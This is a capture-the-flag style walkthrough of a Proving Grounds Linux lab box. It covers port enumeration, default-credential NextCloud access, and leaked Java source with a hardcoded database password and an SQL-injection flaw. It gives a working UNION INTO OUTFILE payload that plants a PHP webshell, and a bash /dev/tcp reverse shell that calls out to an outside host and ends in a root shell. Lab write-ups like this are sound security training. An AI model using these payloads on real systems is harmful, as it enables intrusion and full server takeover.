---
machine: Hawat
platform: Proving Grounds
category: Linux
difficulty: Insane
tags: [issue-tracker, sqli, into-outfile-webshell, nextcloud, leaked-source-code, credential-leak]
date: 2026-09-06
status: retired
summary: A Linux box running a Java issue-tracker app alongside a NextCloud instance — testing leaked backend source code recovered through default-credential NextCloud access, identification of a SQL-injection sink in a custom endpoint, and an INTO OUTFILE webshell write for a direct path to root.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/pg/hawat]
└─$ nmap-full 192.168.131.147
[*] Running fast port discovery on 192.168.131.147...
[sudo] password for kali: 
[*] Open ports: 22,111,139,443,445,17445,30455,50080
[*] Running full scan on 192.168.131.147...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-06 15:45 -0400
Nmap scan report for 192.168.131.147
Host is up (0.060s latency).

PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)
111/tcp   closed rpcbind
139/tcp   closed netbios-ssn
443/tcp   closed https
445/tcp   closed microsoft-ds
17445/tcp open   http         Apache Tomcat (language: en)
|_http-title: Issue Tracker
|_http-trane-info: Problem with XML parsing of /evox/about
30455/tcp open   http         nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: W3.CSS
50080/tcp open   http         Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
|_http-title: W3.CSS Template
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.85 seconds
[*] Checking if UDP/SNMP is up on 192.168.131.147...
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.131.147:161 using SNMPv1 and community 'public'

[!] 192.168.131.147:161 SNMP request timeout
```

On the 17445 webapp we have a ticketing system of some type:

![Issue Tracker app on port 17445 listing three issues with a priority column](/media/Pasted%20image%2020260906144816.png)

We can register a user `notadmin:notadmin` and sign into the portal on 17445, it seems we have the ability to edit add and delete users. We see users clinton and dummy in the Users page.

![Issue Tracker signed in, showing the Users/Issues navigation and the same issue list](/media/Pasted%20image%2020260906145334.png)

Using whatweb we on 30455 webapp we find that its using php.

We can access phpinfo.php and find several useful pieces of information like the webroot path:

```text
|   |   |
|---|---|
|$_SERVER['DOCUMENT_ROOT']|/srv/http|
```

We feroxbust and find nothing significant except for on 50080:

```text
http://target:50080/cloud/index.html
http://target:50080/cloud/status.php
http://target:50080/cloud/lib/private/Config.php
http://target:50080/cloud/lib/base.php
```

It seems theres a NextCloud service at the /cloud directory. If we look at the status.php we see:

![NextCloud status.php JSON response showing version 20.0.7.1](/media/Pasted%20image%2020260906150615.png)

We can tell that we are running version 20.0.7.1 or 20.0.7 of Nextcloud

Navigating to `http://target:50080/cloud/` redirects us to `http://target:50080/cloud/index.php/login`

We can use default creds `admin:admin` to access the portal.

## Foothold

Inside the service we see an issuetracker.zip we can download and extract:

We can find the java source code presumably running as the backend for the issue tracker webapp.

Inside the controller file we find a password for `issue_user:ManagementInsideOld797`:

```java
┌──(kali㉿kali)-[~/…/com/issue/tracker/issues]
└─$ cat IssueController.java 
package com.issue.tracker.issues;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.List;
import java.util.Optional;
import java.util.Properties;

import javax.persistence.EntityManager;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
@RequestMapping
public class IssueController {

        Connection conn = null;

        @Autowired
        private IssueInterface service;

        @Autowired
        EntityManager em;

        @GetMapping("/")
        public String index(Model model) {
                List<Issue> issues = service.GetAll();
                model.addAttribute("issuesList", issues);
                return "index";
        }

        @GetMapping("/issue/list")
        public String list(Model model) {
                List<Issue> issues = service.GetAll();
                model.addAttribute("issuesList", issues);
                return "issue_index";
        }

        @GetMapping("/issue/add")
        public String add(Model model) {

                model.addAttribute("issuesForm", new Issue());
                return "issue_form"; 
        }
        @PostMapping("/issue/save")
        public String save(Issue i, Model model) {
                service.Save(i);
                return "redirect:/issue/list";
        }

        @GetMapping("/issue/checkByPriority")
        public String checkByPriority(@RequestParam("priority") String priority, Model model) {
                // 
                // Custom code, need to integrate to the JPA
                //
            Properties connectionProps = new Properties();
            connectionProps.put("user", "issue_user");
            connectionProps.put("password", "ManagementInsideOld797");
        try {
                        conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
                    String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
            System.out.println(query);
                    Statement stmt = conn.createStatement();
                    stmt.executeQuery(query);

        } catch (SQLException e1) {
                        // TODO Auto-generated catch block
                        e1.printStackTrace();
                }

        // TODO: Return the list of the issues with the correct priority
                List<Issue> issues = service.GetAll();
                model.addAttribute("issuesList", issues);
                return "issue_index";
        
        }

        @GetMapping("/issue/edit/{id}")
        public String edit(@PathVariable int id, Model model) {
                Optional<Issue> issue = service.GetId(id); 
                model.addAttribute("issuesForm",issue);
                return "issue_form";
        }

        @GetMapping("/issue/delete/{id}")
        public String delete(@PathVariable int id, Model model) {
                service.Delete(id);
                return "redirect:/issue/list";
        }
}
```

We also see: `String query = "SELECT message FROM issue WHERE priority='"+priority+"'";`

This means that priority seems vulnerable to sqli, we can intercept a new issue creation POST request and inject our sqli into priority with the following payload encoded `' UNION SELECT '<?php echo system($_GET["cmd"]);' INTO OUTFILE '/srv/http/cmd.php'; -- `:

```http
POST /issue/checkByPriority?priority=%27+UNION+SELECT+%27%3C%3Fphp+echo+system%28%24_GET%5B%22cmd%22%5D%29%3B%27+INTO+OUTFILE+%27%2Fsrv%2Fhttp%2Fcmd.php%27%3B+--+ HTTP/1.1
Host: target:17445
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: ZMSESSID=e0s15v2qjbttlsicsdq5ftug65; _csrf=YkvThYUN-q1OYPBMT_Iy6z5j; express.sid=s%3AETYze2UstjWmX8dKY6In-nq41YcysKpo.9alxIXO08YSCzfsyRJd4IRF2RdH1UIoblhvQdJ6eqcY; JSESSIONID=A7242AF7F81DAD9A8DE4610BD162E288
Connection: keep-alive
Content-Length: 0
```

In the POST above we write a php reverse shell to the /srv/http field and can execute commands through it on the 30455 webapp:

```bash
http://target:30455/cmd.php?cmd=id
uid=0(root) gid=0(root) groups=0(root) uid=0(root) gid=0(root) groups=0(root)
```

We can fire a bash reverseshell encoded in the php webshell and catch it on a listener on port 445.

```bash
http://target:30455/cmd.php?cmd=%2Fbin%2Fbash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.45.177%2F445+0%3E%261

┌──(kali㉿kali)-[~]
└─$ sudo rlwrap -cAr nc -lvnp 445    
[sudo] password for kali: 
listening on [any] 445 ...
connect to [192.168.45.177] from (UNKNOWN) [192.168.131.147] 60930
bash: cannot set terminal process group (291): Inappropriate ioctl for device
bash: no job control in this shell
[root@hawat http]# whoami
whoami
root
```

We can gather the proof.txt from the /root directory and the box is compromised!
